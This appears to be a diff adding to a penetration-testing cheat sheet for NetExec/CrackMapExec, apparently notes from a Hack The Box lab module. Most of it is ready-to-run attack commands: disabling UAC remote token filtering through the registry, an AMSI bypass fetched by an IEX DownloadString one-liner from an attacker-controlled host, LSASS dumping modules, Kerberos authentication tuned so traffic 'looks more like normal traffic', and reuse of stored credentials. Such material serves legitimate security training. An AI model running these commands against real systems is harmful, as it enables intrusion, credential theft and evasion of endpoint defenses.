@@ -172,3 +172,75 @@ netexec smb 10.129.204.133 -u user -p password -M procdump
 netexec smb 10.129.204.133 -u user -p password -M handlekatz
 netexec smb 10.129.204.133 -u user -p password -M nanodump
 ```
+
+- Command execution and defense evasion:
+
+```shell
+# If UAC is enabled. If that's the case, we won't receive the (Pwn3d!) 
+# message even if the account is an administrator.
+netexec smb 10.129.204.133 -u Administrator -p password --local-auth -x "reg add HKLM\SOFTWARE\MICROSOFT\WINDOWS\CURRENTVERSION\POLICIES\SYSTEM /V LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f"
+
+# Different methods to execute commands
+--exec-method smbexec,atexec,wmiexec,mmcexec
+```
+
+> If we got a domain user and it's part of the administrators' group, we could execute the command even with the UAC setting.
+
+- When running PowerShell option `-X`, behind the scenes, CrackMapExec will do the following:
+    - AMSI bypass
+    - Obfuscate the payload
+    - Execute the payload
+
+```shell
+wget https://raw.githubusercontent.com/juliourena/plaintext/master/Powershell/shantanukhande-amsi.ps1 -q
+--amsi-bypass shantanukhande-amsi.ps1
+# OR
+echo "IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.33/shantanukhande-amsi.ps1');" > amsibypass.txt
+--amsi-bypass amsibypass.txt
+```
+
+> Run with `-X`
+
+- SSH key authentication
+
+```shell
+netexec ssh 10.129.204.133 -u user --key-file id_ed25519 -p "" -x whoami
+```
+
+- Modules info at [Academy Link](https://academy.hackthebox.com/app/module/84/section/816)
+
+- Kerberos authentication
+
+```shell
+netexec smb 10.129.203.121 -u user -p password --kerberos --shares
+
+# We can use aes key so our traffic looks more like normal traffic
+netexec smb 10.129.203.121 -u user --aesKey key
+
+# kcache
+impacket-getTGT domain/user:'password' -dc-ip 10.129.203.121
+export KRB5CCNAME=$(pwd)/user.ccache
+netexec smb 10.129.203.121 --use-kcache
+```
+
+- CMEDB
+
+```shell
+ls ~/.cme/workspaces/
+
+# Interact with DBs
+nxcdb
+nxcdb (default)(smb) > back
+nxcdb (default) > workspace create name
+nxcdb (inlanefreight) > workspace list
+nxcdb (inlanefreight) > workspace name_to_switch
+nxcdb (default) > proto smb
+nxcdb (default)(smb) > creds
+nxcdb (default)(smb) > creds name
+nxcdb (default)(smb) > creds hash
+nxcdb (default)(smb) > creds plaintext
+nxcdb (default)(smb) > creds add INLANEFREIGHT john Password3 
+
+# Using creds from DB
+netexec smb 10.129.203.121 -id 4 -x whoami
+```
